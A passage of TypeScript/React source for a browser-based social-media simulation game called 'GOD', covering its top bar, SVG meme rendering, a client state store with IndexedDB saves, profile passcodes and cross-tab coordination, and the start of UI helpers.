          <div role="dialog" aria-label="More" className="sheet-up absolute inset-x-0 bottom-0 rounded-t-3xl border-t border-line bg-surface p-3 pb-[max(1rem,env(safe-area-inset-bottom))]" onClick={(e) => e.stopPropagation()}>
            <div className="mx-auto mb-3 h-1 w-10 rounded-full bg-line" />
            <div className="mb-2 flex items-center justify-between px-1"><span className="text-[13px] font-semibold uppercase tracking-wider text-muted">More</span><button aria-label="Close" onClick={() => setMore(false)} className="grid size-9 place-items-center rounded-full bg-surface-3"><X className="size-4" /></button></div>
            <div className="grid grid-cols-3 gap-2">
              {NAV.filter((n) => !MOBILE.includes(n.id)).map((n) => (
                <button key={n.id} onClick={() => { haptic(); setMore(false); go(`/${n.id}`); }} className={clsx("relative flex min-h-[76px] flex-col items-center justify-center gap-1.5 rounded-2xl bg-surface-2 text-[12px] font-medium active:scale-95", route.view === n.id && "ring-1 ring-gold")}>
                  <n.icon className="size-5" />{n.label}
                  {badge[n.id] ? <span className="absolute right-2 top-2 rounded-full bg-down px-1.5 text-[10px] font-bold text-white">{badge[n.id]}</span> : null}
                </button>
              ))}
              <button onClick={() => { setMore(false); lock(); }} className="flex min-h-[76px] flex-col items-center justify-center gap-1.5 rounded-2xl bg-surface-2 text-[12px] font-medium active:scale-95"><Lock className="size-5" />Switch profile</button>
            </div>
          </div>
        </div>
      )}
      {app.summary && <AwaySummary s={app.summary} />}
      {app.breaking && <BreakingOverlay r={app.breaking} />}
      <Toast />
    </div>
  );
}

function TopBar() {
  const { world: w, now } = useApp();
  const slot = Math.floor(now / 15_000); // trending only needs to refresh every 15s
  const tr = useMemo(() => (w ? trending(w, slot * 15_000 + 14_999, 8) : []), [w, slot]);
  if (!w) return null;
  const nw = netWorth(w);
  const hist = w.player.netWorthHistory;
  const prev = hist.length > 8 ? hist[hist.length - 8].v : nw;
  const godTop = tr.find((t) => t.topic.about === "god");
  return (
    <header className="glass relative z-20 shrink-0 border-b border-line">
      <div className="flex items-center gap-3 px-3 py-2 md:px-4">
        <button onClick={() => go("/dashboard")} className="flex items-center gap-2">
          <span className="grid size-8 place-items-center rounded-lg bg-gradient-to-br from-[#fff3c4] via-gold to-[#8a6416] text-[#120c02]"><Crown className="size-5" /></span>
          <span className="hidden text-[15px] font-black tracking-[0.2em] sm:inline">GOD</span>
        </button>
        <div className="ml-auto flex items-center gap-4 text-[12px]">
          <div className="hidden text-right sm:block">
            <div className="text-[10px] uppercase tracking-wider text-muted">Net worth</div>
            <div className="flex items-center gap-1.5"><Money v={nw} className="text-[14px] font-semibold" /><span className={clsx("num text-[11px]", nw >= prev ? "text-up" : "text-down")}>{nw >= prev ? "▲" : "▼"}{Math.abs(((nw - prev) / (prev || 1)) * 100).toFixed(2)}%</span></div>
          </div>
          <div className="hidden text-right md:block">
            <div className="text-[10px] uppercase tracking-wider text-muted">Followers</div>
            <div className="num text-[14px] font-semibold">{fmtCount(w.player.followers)}</div>
          </div>
          <div className="text-right">
            <div className="text-[10px] uppercase tracking-wider text-muted">Status</div>
            <div className={clsx("text-[12px] font-semibold", godTop && godTop.rank <= 3 ? "text-down" : "text-muted")}>{godTop ? `#${godTop.rank} trending` : "quiet"}</div>
          </div>
        </div>
      </div>
      <div className="relative overflow-hidden border-t border-line/60 bg-bg/40 py-1 text-[11px]">
        <div className="ticker flex w-max gap-8 whitespace-nowrap px-4">
          {[...tr, ...tr].map((t, i) => (
            <button key={i} onClick={() => go(`/chirp/tag/${t.topic.tag}`)} className="flex items-center gap-1.5 text-muted hover:text-fg">
              <span className={t.topic.about === "god" ? "text-gold" : "text-brand"}>#{t.topic.tag}</span>
              <span className="num">{fmtCount(t.posts)} posts</span>
              {t.topic.breaking && <span className="rounded bg-down px-1 font-bold text-white">BREAKING</span>}
            </button>
          ))}
        </div>
      </div>
    </header>
  );
}

export const haptic = (ms = 8) => { try { if (typeof navigator !== "undefined" && "vibrate" in navigator) navigator.vibrate(ms); } catch { /* not supported */ } };

function Elsewhere() {
  return (
    <div className="grid h-dvh place-items-center p-6">
      <div className="max-w-sm text-center">
        <Crown className="mx-auto size-10 text-gold" />
        <div className="mt-3 text-[17px] font-semibold">GOD is open in another tab</div>
        <p className="mt-1 text-[13px] text-muted">Only one tab keeps your world running at a time so nothing gets out of sync.</p>
        <button onClick={takeOverHere} className="btn btn-gold mt-5">Use here</button>
      </div>
    </div>
  );
}

function Splash() {
  return (
    <main className="grid h-dvh place-items-center">
      <div className="flex flex-col items-center gap-3">
        <Crown className="size-10 animate-pulse text-gold" />
      </div>
    </main>
  );
}

```

## src/components/MemeImage.tsx
```tsx
"use client";
import { memo, useEffect, useState } from "react";
import { createPortal } from "react-dom";
import { memeAlt, type MemeSpec } from "@/lib/sim/memes";
import { avatarUri, GOD_AVATAR } from "@/lib/sim/avatar";
import type { PfpStyle } from "@/lib/sim/types";

/** greedy word wrap for SVG text */
function wrap(text: string, max: number, lines = 4): string[] {
  const out: string[] = [];
  let cur = "";
  for (const w of text.split(/\s+/)) {
    if (!w) continue;
    if ((cur + " " + w).trim().length > max && cur) { out.push(cur); cur = w; } else cur = (cur + " " + w).trim();
  }
  if (cur) out.push(cur);
  if (out.length > lines) { out.length = lines; out[lines - 1] = out[lines - 1].replace(/.{0,2}$/, "…"); }
  return out;
}

const IMPACT = "'Arial Black', 'Helvetica Neue', Arial, sans-serif";

function Caption({ text, y, size = 30, max = 20, anchor = "top", fill = "#fff" }: { text: string; y: number; size?: number; max?: number; anchor?: "top" | "bottom"; fill?: string }) {
  const ls = wrap(text.toUpperCase(), max, 3);
  const y0 = anchor === "top" ? y : y - (ls.length - 1) * size * 1.08;
  return (
    <text x={200} y={y0} textAnchor="middle" fontFamily={IMPACT} fontWeight={900} fontSize={size} fill={fill} stroke="#000" strokeWidth={size / 7} paintOrder="stroke" strokeLinejoin="round">
      {ls.map((l, i) => <tspan key={i} x={200} dy={i ? size * 1.08 : 0}>{l}</tspan>)}
    </text>
  );
}

function Plain({ text, x = 20, y, size = 19, max = 34, fill = "#111", weight = 700, lines = 3 }: { text: string; x?: number; y: number; size?: number; max?: number; fill?: string; weight?: number; lines?: number }) {
  return (
    <text x={x} y={y} fontFamily="ui-sans-serif, system-ui, sans-serif" fontWeight={weight} fontSize={size} fill={fill}>
      {wrap(text, max, lines).map((l, i) => <tspan key={i} x={x} dy={i ? size * 1.25 : 0}>{l}</tspan>)}
    </text>
  );
}

/** an illustrated backdrop: gradient sky, sun or spotlight, sparkles; all seeded */
function Scene({ hue, seed, id }: { hue: number; seed: number; id: string }) {
  const r = (k: number) => ((Math.sin(seed * 9301 + k * 49297) + 1) / 2) % 1;
  return (
    <>
      <defs>
        <linearGradient id={`${id}g`} x1="0" y1="0" x2="0" y2="1">
          <stop offset="0" stopColor={`hsl(${hue} 70% 62%)`} />
          <stop offset="1" stopColor={`hsl(${(hue + 50) % 360} 60% 22%)`} />
        </linearGradient>
        <radialGradient id={`${id}s`}><stop offset="0" stopColor="#fff8" /><stop offset="1" stopColor="#fff0" /></radialGradient>
      </defs>
      <rect width="400" height="400" fill={`url(#${id}g)`} />
      <circle cx={80 + r(1) * 240} cy={120 + r(2) * 60} r={110} fill={`url(#${id}s)`} />
      {Array.from({ length: 9 }, (_, i) => <circle key={i} cx={r(i + 3) * 400} cy={r(i + 13) * 400} r={1.5 + r(i + 23) * 3} fill="#fff" opacity={0.5} />)}
      <path d={`M0 ${330 + r(4) * 20} Q 100 ${300 + r(5) * 30} 200 ${325} T 400 ${320 + r(6) * 20} V400 H0Z`} fill="#0006" />
    </>
  );
}

const Emoji = ({ e, x, y, size }: { e?: string; x: number; y: number; size: number }) => (
  <text x={x} y={y} fontSize={size} textAnchor="middle" dominantBaseline="central">{e}</text>
);

function Svg({ m, id }: { m: MemeSpec; id: string }) {
  switch (m.f) {
    case "caption":
      return (<svg viewBox="0 0 400 400"><Scene hue={m.hue} seed={m.seed} id={id} /><Emoji e={m.art} x={200} y={210} size={150} />{m.top && <Caption text={m.top} y={48} />}{m.bottom && <Caption text={m.bottom} y={378} anchor="bottom" />}</svg>);
    case "reaction":
      return (<svg viewBox="0 0 400 400"><rect width="400" height="110" fill="#fff" /><Plain text={m.top ?? ""} y={38} size={21} max={32} /><g transform="translate(0 110)"><rect width="400" height="290" fill={`hsl(${m.hue} 45% 30%)`} /><circle cx="200" cy="150" r="115" fill={`hsl(${m.hue} 60% 45%)`} opacity=".55" /><Emoji e={m.art} x={200} y={150} size={170} /></g></svg>);
    case "pov":
      return (<svg viewBox="0 0 400 400"><Scene hue={m.hue} seed={m.seed} id={id} /><rect y="0" width="400" height="96" fill="#000a" /><Plain text={m.top ?? ""} y={36} size={20} max={34} fill="#fff" /><Emoji e={m.art} x={200} y={240} size={160} />{m.bottom && <Caption text={m.bottom} y={380} size={24} max={26} anchor="bottom" />}</svg>);
    case "compare":
      return (
        <svg viewBox="0 0 400 400">
          <rect width="400" height="400" fill="#fff" />
          {m.top && <Plain text={m.top} y={30} size={18} max={36} />}
          {[0, 1].map((i) => (
            <g key={i} transform={`translate(${i ? 204 : 6} ${m.top ? 50 : 10})`}>
              <rect width="190" height="250" rx="10" fill={`hsl(${(m.hue + i * 150) % 360} ${i ? 65 : 25}% ${i ? 50 : 70}%)`} />
              <Emoji e={i ? m.art2 : m.art} x={95} y={125} size={110} />
              <Plain text={(i ? m.b : m.a) ?? ""} x={6} y={290} size={16} max={20} lines={4} />
            </g>
          ))}
        </svg>
      );
    case "chart": {
      const pts = m.trend === "spike" ? [10, 12, 9, 14, 11, 13, 95] : m.trend === "crash" ? [90, 86, 92, 88, 30, 12, 8] : m.trend === "down" ? [80, 70, 64, 50, 44, 30, 22] : [12, 20, 26, 40, 52, 70, 92];
      const path = pts.map((v, i) => `${i ? "L" : "M"}${50 + i * 52} ${330 - v * 2.5}`).join(" ");
      const col = m.trend === "crash" || m.trend === "down" ? "#ef4444" : "#22c55e";
      return (
        <svg viewBox="0 0 400 400">
          <rect width="400" height="400" fill="#0f1115" />
          <Plain text={m.top ?? ""} y={38} size={22} max={30} fill="#fff" weight={800} />
          {[0, 1, 2, 3].map((i) => <line key={i} x1="50" x2="370" y1={330 - i * 70} y2={330 - i * 70} stroke="#ffffff1a" />)}
          <path d={`${path} L362 330 L50 330Z`} fill={col} opacity=".15" />
          <path d={path} fill="none" stroke={col} strokeWidth="5" strokeLinejoin="round" strokeLinecap="round" />
          <Emoji e={m.art} x={362} y={330 - pts[6] * 2.5 - 26} size={34} />
          <text x="50" y="360" fill="#9aa" fontSize="15" fontFamily="ui-sans-serif, system-ui">{m.a}</text>
          <text x="370" y="360" fill="#9aa" fontSize="15" textAnchor="end" fontFamily="ui-sans-serif, system-ui">{m.b}</text>
        </svg>
      );
    }
    case "starter":
      return (
        <svg viewBox="0 0 400 400">
          <rect width="400" height="400" fill="#fafafa" />
          <Plain text={m.top ?? ""} y={36} size={21} max={32} weight={900} />
          {(m.arts ?? []).slice(0, 4).map((e, i) => (
            <g key={i} transform={`translate(${20 + (i % 2) * 190} ${80 + Math.floor(i / 2) * 155})`}>
              <rect width="170" height="140" rx="8" fill={`hsl(${(m.hue + i * 70) % 360} 50% 88%)`} />
              <Emoji e={e} x={85} y={70} size={80} />
            </g>
          ))}
        </svg>
      );
    case "leakdoc": {
      const d = m.doc!;
      const MONO = "ui-monospace, 'SFMono-Regular', Menlo, monospace";
      return (
        <svg viewBox="0 0 400 400">
          <rect width="400" height="400" fill="#07090d" />
          {Array.from({ length: 14 }, (_, i) => <rect key={i} x={0} y={i * 29} width="400" height="1" fill="#39ff8812" />)}
          <g transform="rotate(-2.5 200 200)">
            <rect x="34" y="34" width="332" height="318" rx="4" fill="#f4f1e8" />
            <rect x="34" y="34" width="332" height="40" rx="4" fill="#e6e1d3" />
            <text x="48" y="60" fontSize="14" fontWeight="700" fill="#1a1a1a" fontFamily={MONO}>{d.title.length > 36 ? d.title.slice(0, 35) + "…" : d.title}</text>
            {d.lines.slice(0, 8).map((l, i) => {
              const parts = l.split(/(█+)/);
              let x = 48;
              return (
                <g key={i}>
                  {parts.map((p, k) => {
                    const w = p.length * 7.6;
                    const el = /^█+$/.test(p) ? <rect key={k} x={x} y={88 + i * 30} width={w} height="15" fill="#111" /> : <text key={k} x={x} y={100 + i * 30} fontSize="13" fill="#222" fontFamily={MONO} xmlSpace="preserve">{p}</text>;
                    x += w;
                    return el;
                  })}
                </g>
              );
            })}
          </g>
          <g transform="rotate(-14 285 300)">
            <rect x="205" y="278" width="170" height="44" rx="6" fill="none" stroke="#dc2626" strokeWidth="4" opacity=".85" />
            <text x="290" y="309" textAnchor="middle" fontSize="22" fontWeight="900" fill="#dc2626" opacity=".85" fontFamily={IMPACT}>{d.stamp}</text>
          </g>
          <text x="200" y="388" textAnchor="middle" fontSize="12" fill="#39ff88" fontFamily={MONO}>{`>_ ${d.by} :: unverified`}</text>
        </svg>
      );
    }
    case "chirpshot": {
      const s = m.shot!;
      const av = s.gold ? GOD_AVATAR : avatarUri((s.pfp ?? "default") as PfpStyle, s.seed, s.name);
      const body = wrap(s.text, 34, 5);
      return (
        <svg viewBox="0 0 400 400">
          <rect width="400" height="400" fill={`hsl(${m.hue} 30% 20%)`} />
          {m.top && <Caption text={m.top} y={44} size={24} max={24} />}
          <g transform="translate(20 90)">
            <rect width="360" height={110 + body.length * 24} rx="16" fill="#fff" />
            <image href={av} x="16" y="16" width="44" height="44" clipPath="circle(22px at 22px 22px)" />
            <text x="70" y="34" fontSize="16" fontWeight="800" fill="#0b0d12" fontFamily="ui-sans-serif, system-ui">{s.name}{s.gold ? " ✦" : ""}</text>
            <text x="70" y="54" fontSize="14" fill="#666" fontFamily="ui-sans-serif, system-ui">@{s.handle} · chirp</text>
            {body.map((l, i) => <text key={i} x="16" y={90 + i * 24} fontSize="18" fill="#0b0d12" fontFamily="ui-sans-serif, system-ui">{l}</text>)}
            <text x="16" y={90 + body.length * 24 + 10} fontSize="13" fill="#888" fontFamily="ui-sans-serif, system-ui">♥ {s.likes.toLocaleString("en-US")}   ↻ {Math.round(s.likes / 7).toLocaleString("en-US")}</text>
          </g>
        </svg>
      );
    }
  }
}

/** A meme attachment: tap to view it bigger. */
export const MemeImage = memo(function MemeImage({ m, id, className, still }: { m: MemeSpec; id: string; className?: string; still?: boolean }) {
  const [open, setOpen] = useState(false);
  const sid = `mm${id.replace(/[^a-z0-9]/gi, "")}`;
  useEffect(() => {
    if (!open) return;
    const k = (e: KeyboardEvent) => { if (e.key === "Escape") setOpen(false); };
    window.addEventListener("keydown", k);
    return () => window.removeEventListener("keydown", k);
  }, [open]);
  // inside a card that opens on tap: just the picture, the card handles the tap
  if (still) return <div data-meme={m.f} role="img" aria-label={memeAlt(m)} className={className}><Svg m={m} id={sid} /></div>;
  return (
    <>
      <button type="button" data-meme={m.f} aria-label={memeAlt(m)} onClick={(e) => { e.stopPropagation(); setOpen(true); }} className={className ?? "mt-1.5 block w-full max-w-[300px] overflow-hidden rounded-lg border border-line bg-black/20 [&_svg]:block [&_svg]:h-auto [&_svg]:w-full"}>
        <Svg m={m} id={sid} />
      </button>
      {open && typeof document !== "undefined" && createPortal(
        <div role="dialog" aria-label="Image" onClick={() => setOpen(false)} className="fixed inset-0 z-[80] grid place-items-center bg-black/85 p-4">
          <div className="w-full max-w-[min(92vw,560px)] overflow-hidden rounded-xl [&_svg]:block [&_svg]:h-auto [&_svg]:w-full"><Svg m={m} id={`${sid}big`} /></div>
        </div>, document.body)}
    </>
  );
});

```

## src/components/store.ts
```ts
"use client";
import { useSyncExternalStore } from "react";
import { indexedDbKV, type KV } from "@/lib/persistence/kv";
import { clearWorld, createProfile, deleteProfile, listProfiles, loadWorld, saveWorld, setPasscode, updateProfile, verifyPasscode, type Profile } from "@/lib/persistence/profiles";
import { applyAction, baseline, bootstrap, godEdit, godPin, godPost, godPostAction, godReact, godSay, resolveEvent, simulate, summarize, type ActionInput, type RippleResult } from "@/lib/sim/engine";
import { createWorld } from "@/lib/sim/world";
import { godJoinVoice, godLeaveVoice, godStopTyping, godTyping } from "@/lib/sim/presence";
import { liveReply } from "@/lib/live/client";
import type { CatchUpSummary, PlatformId, Settings, WorldState } from "@/lib/sim/types";

export type Phase = "boot" | "profiles" | "catchup" | "ready" | "elsewhere";
export type Summary = CatchUpSummary & { netWorthDelta: number; followerDelta: number };

export interface AppState {
  phase: Phase;
  profiles: Profile[];
  profile?: Profile;
  world?: WorldState;
  now: number;
  progress: number; // 0..1 catch-up progress
  summary?: Summary;
  breaking?: RippleResult;
  toast?: { text: string; t: number; ms?: number };
  rev: number;
  lastRead: Record<string, number>;
}

const SESSION = "god-sim:unlocked";
let kv: KV;
let st: AppState = { phase: "boot", profiles: [], now: 0, progress: 0, rev: 0, lastRead: {} };
const subs = new Set<() => void>();
const emit = () => { st = { ...st, rev: st.rev + 1 }; subs.forEach((f) => f()); };
const set = (p: Partial<AppState>) => { st = { ...st, ...p }; emit(); };
export const getState = () => st;
export function useApp(): AppState {
  return useSyncExternalStore((f) => { subs.add(f); return () => subs.delete(f); }, () => st, () => st);
}

/** Dev/demo: ?away=6h pretends you were gone that long (only for brand-new worlds or ?demo). */
function awayParam(): number {
  if (typeof location === "undefined") return 0;
  const v = new URLSearchParams(location.search).get("away");
  if (!v) return 0;
  const m = /^(\d+(?:\.\d+)?)(m|h|d)?$/.exec(v);
  if (!m) return 0;
  return Number(m[1]) * ({ m: 60e3, h: 3600e3, d: 86400e3 }[m[2] ?? "h"] as number);
}

let tick: ReturnType<typeof setInterval> | undefined;
/* ---------- one tab runs the world: the others step aside ---------- */
let bc: BroadcastChannel | undefined;
const TAB = Math.random().toString(36).slice(2);
function tabChannel() {
  if (bc || typeof BroadcastChannel === "undefined") return bc;
  bc = new BroadcastChannel("god-sim:tabs");
  bc.onmessage = async (e: MessageEvent<{ type: string; profile: string; tab: string }>) => {
    const d = e.data;
    if (d.tab === TAB || !st.profile || d.profile !== st.profile.id) return;
    if (d.type === "claim" && st.phase === "ready") {
      if (tick) clearInterval(tick);
      tick = undefined;
      await flushNow();
      set({ phase: "elsewhere" });
      bc?.postMessage({ type: "released", profile: d.profile, tab: TAB });
    }
  };
  return bc;
}
/** ask other tabs running this profile to save and pause; resolves when they did (or nobody answered) */
function claim(profileId: string): Promise<void> {
  const ch = tabChannel();
  if (!ch) return Promise.resolve();
  return new Promise((res) => {
    const done = () => { clearTimeout(timer); ch.removeEventListener("message", on); res(); };
    const on = (e: MessageEvent<{ type: string; profile: string }>) => { if (e.data.type === "released" && e.data.profile === profileId) done(); };
    const timer = setTimeout(done, 350);
    ch.addEventListener("message", on);
    ch.postMessage({ type: "claim", profile: profileId, tab: TAB });
  });
}
export async function takeOverHere() {
  if (!st.profile) return;
  await openProfile(st.profile, st.profiles);
}

let saveTimer: ReturnType<typeof setTimeout> | undefined;
let dirty = false;

export async function init() {
  if (st.phase !== "boot") return;
  kv = indexedDbKV("god-sim");
  const profiles = await listProfiles(kv);
  const params = new URLSearchParams(location.search);
  if (params.get("demo") !== null && !profiles.length) {
    const p = await createProfile(kv, "God", undefined, params.get("seed") ?? "demo-universe");
    return openProfile(p, [p]);
  }
  const unlocked = sessionStorage.getItem(SESSION);
  const auto = profiles.find((p) => p.id === unlocked) ?? (profiles.length === 1 && !profiles[0].passHash ? profiles[0] : undefined);
  if (auto) return openProfile(auto, profiles);
  set({ phase: "profiles", profiles });
}

export async function newProfile(name: string, passcode?: string) {
  const p = await createProfile(kv, name, passcode || undefined);
  await openProfile(p, await listProfiles(kv));
}

export async function unlock(p: Profile, passcode: string): Promise<boolean> {
  if (!(await verifyPasscode(p, passcode))) return false;
  await openProfile(p, st.profiles);
  return true;
}

export async function removeProfile(id: string) {
  await deleteProfile(kv, id);
  set({ profiles: await listProfiles(kv) });
}

export function lock() {
  flush();
  sessionStorage.removeItem(SESSION);
  if (tick) clearInterval(tick);
  set({ phase: "profiles", world: undefined, profile: undefined, summary: undefined });
}

async function openProfile(p: Profile, profiles: Profile[]) {
  sessionStorage.setItem(SESSION, p.id);
  set({ profiles, profile: p, phase: "catchup", progress: 0, world: undefined });
  await claim(p.id);
  const now = Date.now();
  const away = awayParam();
  let w = await loadWorld(kv, p.id);
  if (!w) {
    // brand-new universe: 3h of history, then (optionally) a pretend absence
    w = createWorld(p.seed, now - away);
    bootstrap(w, now - away, 3, { defer: true }); // history is simulated in small slices below
    w.player.displayName = p.name;
  } else if (away && new URLSearchParams(location.search).get("demo") !== null) {
    w.lastSeenAt = Math.min(w.lastSeenAt, now - away);
  }
  try { st.lastRead = JSON.parse(localStorage.getItem(`god-sim:read:${p.id}`) ?? "{}"); } catch { st.lastRead = {}; }
  await runCatchUp(w, now);
}

let catching = false;
async function runCatchUp(w: WorldState, to: number, quiet = false) {
  if (catching) return;
  catching = true;
  try { await runCatchUpInner(w, to, quiet); } finally { catching = false; }
}
/** simulate up to `to` in ~12ms slices, yielding to the browser in between */
async function sliced(w: WorldState, to: number, onSlice: (processed: number, compressed: boolean) => void) {
  for (;;) {
    const t0 = performance.now();
    let processed = 0, compressed = false;
    while (performance.now() - t0 < 12) {
      const r = simulate(w, to, { maxBuckets: 12 });
      compressed ||= r.compressed;
      processed += r.processed;
      if (!r.processed) break;
    }
    if (!processed) return;
    onSlice(processed, compressed);
    await new Promise((res) => setTimeout(res, 0));
  }
}
async function runCatchUpInner(w: WorldState, to: number, quiet = false) {
  const from = w.lastSeenAt;
  const total = Math.max(1, Math.min(to - w.simTime, 24 * 3600e3) / 10_000);
  let done = 0;
  const progress = (n: number) => { done += n; if (!quiet) set({ progress: Math.min(1, done / total) }); };
  // a brand-new world first builds its history up to the moment you "left"
  if (w.simTime < from) await sliced(w, from, (n) => progress(n));
  const base = baseline(w, from);
  await sliced(w, to, (n, c) => { if (c) base.compressed = true; progress(n); });
  w.lastSeenAt = to;
  const gone = to - from;
  // a tab that stayed open in the background just catches up in place, no "while you were away" card
  const summary = !quiet && gone > 10 * 60e3 ? summarize(w, base, to) : undefined;
  set(quiet ? { world: w, now: to } : { world: w, phase: "ready", now: to, summary, progress: 1 });
  if (w.undernet?.announce) { delete w.undernet.announce; setTimeout(() => toast("New: The Undernet 🕸️ · DM gh0st_", 6000), 1200); }
  dirty = true;
  scheduleSave();
  startTick();
}

/** is anything about to change on screen (a message landing, someone typing, a reaction)? */
function hot(w: WorldState, from: number, to: number) {
  for (const m of w.pending) {
    if (m.t > from && m.t <= to + 4000) return true;
    if (m.typingFrom && m.typingFrom > from && m.typingFrom <= to) return true;
  }
  return false;
}
let lastEmit = 0;
const hidden = () => typeof document !== "undefined" && document.visibilityState === "hidden";
/** one simulation step up to the wall clock. Runs in background tabs too (timers there are throttled, so it uses elapsed time) */
function step(forceEmit = false) {
  const w = st.world;
  if (!w || catching || st.phase !== "ready") return;
  const now = Date.now();
  if (now - w.simTime > 5 * 60e3) { void runCatchUp(w, now, true); return; } // throttled tab or device slept: catch up in slices
  if (focus) w.focus = { ...focus, t: now };
  const r = simulate(w, now);
  w.lastSeenAt = now;
  if (r.processed) dirty = true;
  // nobody is looking: keep simulating but skip re-rendering
  if (!hidden() && (forceEmit || now - lastEmit >= 950 || hot(w, st.now, now))) { lastEmit = now; set({ now }); }
  scheduleSave();
}
function startTick() {
  if (tick) clearInterval(tick);
  tick = setInterval(() => step(), 250);
  if (typeof document !== "undefined") {
    document.onvisibilitychange = () => { if (hidden()) flush(); else step(true); };
    window.onpagehide = () => flush();
  }
}

type Idle = (cb: () => void, o?: { timeout: number }) => number;
function scheduleSave() {
  if (saveTimer || !dirty) return;
  // save when the browser is idle (at most every ~8s), never in the middle of an animation frame
  saveTimer = setTimeout(() => {
    const ric = (globalThis as { requestIdleCallback?: Idle }).requestIdleCallback;
    if (ric) ric(() => { saveTimer = undefined; flush(); }, { timeout: 4000 });
    else { saveTimer = undefined; flush(); }
  }, 8000);
}
export function flush() { void flushNow(); }
async function flushNow() {
  if (!st.world || !st.profile || !dirty || st.phase === "elsewhere") return;
  dirty = false;
  st.world.lastSeenAt = Math.max(st.world.lastSeenAt, Date.now());
  try { await saveWorld(kv, st.profile.id, st.world); } catch { dirty = true; }
}

const mutate = <T,>(fn: (w: WorldState, now: number) => T): T | undefined => {
  const w = st.world;
  if (!w || st.phase !== "ready") return;
  const now = Date.now();
  const r = fn(w, now);
  dirty = true;
  set({ now });
  scheduleSave();
  return r;
};

export function doAction(input: ActionInput) {
  return mutate((w, now) => {
    const r = applyAction(w, input, now);
    if (!("error" in r) && r.breaking) set({ breaking: r });
    return r;
  });
}
export function doEvent(id: string, choice: string) {
  return mutate((w, now) => {
    const r = resolveEvent(w, id, choice, now);
    if (!("error" in r) && r.ripple?.breaking) set({ breaking: r.ripple });
    return r;
  });
}
export const doSay = (serverId: string, channelId: string, text: string, replyTo?: string) => mutate((w, now) => {
  const before = new Set(w.pending);
  const r = godSay(w, serverId, channelId, text, now, replyTo);
  const fresh = w.pending.filter((m) => !before.has(m) && m.authorId !== "god");
  void liveReply(w, r.message, fresh, { now: () => Date.now(), changed: () => { if (st.world !== w) return; dirty = true; set({ now: Date.now() }); scheduleSave(); } });
  return r;
});
export const doEdit = (id: string, text: string) => mutate((w, now) => godEdit(w, id, text, now));
export const doDelete = (id: string) => mutate((w, now) => godEdit(w, id, null, now));
export const doReact = (id: string, emoji: string) => mutate((w, now) => { simulate(w, now); return godReact(w, id, emoji, now); });
export const doTyping = (serverId: string, channelId: string) => mutate((w, now) => { simulate(w, now); return godTyping(w, serverId, channelId, now); });
export const doStopTyping = (channelId: string) => mutate((w, now) => godStopTyping(w, channelId, now));
export const doJoinVoice = (serverId: string, vcId: string) => mutate((w, now) => { simulate(w, now); return godJoinVoice(w, serverId, vcId, now); });
export const doLeaveVoice = () => mutate((w, now) => { simulate(w, now); return godLeaveVoice(w, now); });
export const doPin = (id: string) => mutate((w, now) => godPin(w, id, now));
export const doPostAction = (id: string, kind: "like" | "repost") => mutate((w) => godPostAction(w, id, kind));
export const doPost = (platform: PlatformId, text: string, quoteOf?: string, replyTo?: string) =>
  mutate((w, now) => { const r = godPost(w, platform, text, now, quoteOf, replyTo); if (r.breaking) set({ breaking: r }); return r; });
/** the channel on screen: the world keeps it alive while you're looking at it */
let focus: { serverId: string; channelId: string } | undefined;
export function setFocus(f?: { serverId: string; channelId: string }) {
  focus = f;
  if (st.world) st.world.focus = f ? { ...f, t: Date.now() } : undefined;
}
export const editWorld = (fn: (w: WorldState) => void) => mutate((w) => fn(w));
export const updateSettings = (p: Partial<Settings>) => mutate((w) => { Object.assign(w.settings, p); });
export const dismissSummary = () => set({ summary: undefined });
export const dismissBreaking = () => set({ breaking: undefined });
export const toast = (text: string, ms = 3500) => set({ toast: { text, t: Date.now(), ms } });

let readTimer: ReturnType<typeof setTimeout> | undefined;
export function markRead(channelId: string) {
  st.lastRead[channelId] = Date.now();
  if (readTimer || !st.profile) return;
  const id = st.profile.id;
  readTimer = setTimeout(() => { readTimer = undefined; localStorage.setItem(`god-sim:read:${id}`, JSON.stringify(st.lastRead)); }, 3000);
}

export async function resetUniverse(newSeed?: string) {
  if (!st.profile) return;
  if (tick) clearInterval(tick);
  const p = st.profile;
  if (newSeed) { p.seed = newSeed; await updateProfile(kv, p); }
  await clearWorld(kv, p.id);
  localStorage.removeItem(`god-sim:read:${p.id}`);
  st.lastRead = {};
  set({ phase: "catchup", world: undefined, summary: undefined, progress: 0 });
  const now = Date.now();
  const w = createWorld(p.seed, now);
  bootstrap(w, now, 3, { defer: true });
  w.player.displayName = p.name;
  w.lastSeenAt = now;
  await runCatchUp(w, now);
}

export async function changePasscode(passcode: string | null) {
  if (!st.profile) return;
  await setPasscode(st.profile, passcode);
  await updateProfile(kv, st.profile);
  set({ profiles: await listProfiles(kv) });
}

```

## src/components/ui.tsx
```tsx
"use client";
import clsx from "clsx";
import { BadgeCheck, Shield, Bot } from "lucide-react";
import { avatarUri, GOD_AVATAR } from "@/lib/sim/avatar";
import { STANCE_INFO } from "@/lib/sim/characters";
import type { Character, WorldState } from "@/lib/sim/types";
import { fmtMoney } from "@/lib/sim/format";

const uriCache = new Map<string, string>();
export function avatarFor(c: Pick<Character, "pfp" | "avatarSeed" | "displayName">) {
  const k = `${c.pfp}:${c.avatarSeed}`;
  let u = uriCache.get(k);
  if (!u) { u = avatarUri(c.pfp, c.avatarSeed, c.displayName); uriCache.set(k, u); }
  return u;
}

export interface Who {
  id: string;
  name: string;
  handle: string;
  avatar: string;
  verified?: boolean;
  kind: "god" | "char" | "outlet" | "bot";
  char?: Character;
  color?: string;
}

const BOT_AV = (label: string, color: string) => `data:image/svg+xml;utf8,${encodeURIComponent(`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64"><rect width="64" height="64" fill="${color}"/><text x="32" y="41" font-family="sans-serif" font-size="26" font-weight="700" text-anchor="middle" fill="#fff">${label}</text></svg>`)}`;

export function who(s: WorldState, id: string): Who {
  if (id === "god") return { id, name: s.player.displayName || "God", handle: "god", avatar: GOD_AVATAR, verified: true, kind: "god" };
  if (id.startsWith("o-")) {
    const o = s.outlets.find((x) => x.id === id.slice(2));
    return { id, name: o?.name ?? "News", handle: (o?.short ?? "news").toLowerCase(), avatar: BOT_AV(o?.short.slice(0, 2) ?? "N", o?.color ?? "#444"), verified: true, kind: "outlet", color: o?.color };
  }
  if (id.startsWith("bot-")) {
    const n = id === "bot-tally" ? "Tally" : id === "bot-starboard" ? "Starboard" : "Bot";
    return { id, name: n, handle: n.toLowerCase(), avatar: BOT_AV(n === "Tally" ? "#" : "★", n === "Tally" ? "#5865f2" : "#c9961a"), kind: "bot" };
  }
  const c = s.characters[Number(id.slice(1))];
